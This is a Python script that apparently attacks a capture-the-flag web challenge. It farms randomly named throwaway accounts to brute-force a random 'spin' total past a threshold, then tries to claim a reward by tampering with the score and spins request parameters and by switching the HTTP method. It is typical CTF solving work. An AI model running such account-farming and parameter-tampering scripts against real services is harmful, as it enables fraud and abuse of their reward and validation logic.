import requests, string, random

base = 'https://web-random-cheese.tracebash.xyz'

def check_perms():
    s = requests.Session()
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    s.post(f'{base}/register', data={'username': name, 'password': name})
    s.post(f'{base}/login', data={'username': name, 'password': name})
    
    vals = []
    for _ in range(10):
        r = s.post(f'{base}/spin')
        d = r.json()
        vals.append(d['val'])
    total = sum(vals)
    return total, vals, s

# Try 10 different users, see max sum
best = 0
for i in range(10):
    total, vals, s = check_perms()
    print(f'User {i}: sum={total}, vals={vals}')
    if total > best:
        best = total
        if total >= 85:
            r = s.post(f'{base}/claim')
            print('CLAIM SUCCESS!', r.text[:2000].encode('ascii', errors='replace').decode('ascii'))
            break

print(f'Best sum found: {best}')

# Also check if we can send score as form param to claim
s2 = requests.Session()
name2 = ''.join(random.choices(string.ascii_lowercase, k=8))
s2.post(f'{base}/register', data={'username': name2, 'password': name2})
s2.post(f'{base}/login', data={'username': name2, 'password': name2})
r = s2.post(f'{base}/spin')
print('\nSingle spin result:', r.json())

# Try to claim with extra params
r = s2.post(f'{base}/claim', data={'score': '100', 'spins': '10'})
print('Claim with params:', r.status_code)
print(r.text[:500].encode('ascii', errors='replace').decode('ascii'))

# Try to GET claim
r = s2.get(f'{base}/claim')
print('GET claim:', r.status_code, r.text[:200].encode('ascii', errors='replace').decode('ascii'))